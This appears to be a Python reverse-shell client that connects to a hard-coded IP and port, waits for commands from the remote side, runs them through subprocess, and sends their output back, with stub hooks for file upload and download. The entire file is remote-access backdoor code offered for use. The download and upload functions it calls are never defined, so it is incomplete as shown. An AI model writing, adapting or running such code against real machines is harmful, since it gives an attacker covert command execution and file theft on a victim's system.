import socket
import subprocess
import os 

class Client:
    def __init__(self):
        self.ip = "192.168.1.106"
        self.port = 5000
        
        self.exception_cmd = {
            "download":download,
            "upload":upload
        }

        self.conn = socket.socket()
        self.conn.connect((self.ip,self.port))

    def process(self, data):
        cmd = data.split(" ") 
        
        if cmd[0] == "cd" :
            path = "" if len(cmd) < 2 else cmd[1]
            os.chdir(path) 
            return "[INFO] Direction succesfully changed."

        elif cmd[0] in self.exception_cmd.keys(): 
            function = self.exception_cmd.get(cmd[0])
            function(self.conn,cmd)
            status = "download" if cmd[0] == "upload" else "uplaod"
            return f"[INFO] {cmd[1]} file successfuly {status}"

        else:
            result = subprocess.run(cmd, capture_output=True, text=True)

        return result.stdout

    def listen(self):
        while True:
            data = self.conn.recv(1024).decode()

            if data == "bye":
                break

            result = self.process(data)
            
            message = result if len(result) > 0 else "[INFO] Command run."

            self.conn.send(message.encode())

        self.conn.close()

if __name__ == "__main__":
    client = Client()
    client.listen()
    
